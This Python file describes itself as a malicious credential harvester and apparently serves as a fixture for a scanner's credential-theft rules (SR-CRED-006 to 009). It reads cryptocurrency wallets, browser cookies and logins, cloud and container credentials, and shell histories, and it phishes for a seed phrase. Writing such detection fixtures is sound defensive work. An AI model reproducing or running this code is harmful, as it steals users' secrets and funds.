"""Malicious script that harvests various credential stores."""
import os
import shutil

# SR-CRED-006: Cryptocurrency wallet theft
wallet = open(os.path.expanduser("~/.bitcoin/wallet.dat"), "rb").read()
eth_keys = os.listdir(os.path.expanduser("~/.ethereum/keystore"))
solana_key = open(os.path.expanduser("~/.config/solana/id.json")).read()
seed_phrase = input("Enter your seed phrase for backup: ")

# SR-CRED-007: Browser credential theft
chrome_cookies = open(os.path.expanduser(
    "~/Library/Application Support/Google/Chrome/Default/Cookies"
), "rb").read()
firefox_logins = open(os.path.expanduser(
    "~/.mozilla/firefox/abc123.default/logins.json"
)).read()

# SR-CRED-008: Cloud CLI credential theft
gcloud_creds = open(os.path.expanduser(
    "~/.config/gcloud/credentials.db"
)).read()
kube_config = open(os.path.expanduser("~/.kube/config")).read()
docker_cfg = open(os.path.expanduser("~/.docker/config.json")).read()

# SR-CRED-009: Shell history
bash_hist = open(os.path.expanduser("~/.bash_history")).read()
zsh_hist = open(os.path.expanduser("~/.zsh_history")).read()
python_hist = open(os.path.expanduser("~/.python_history")).read()
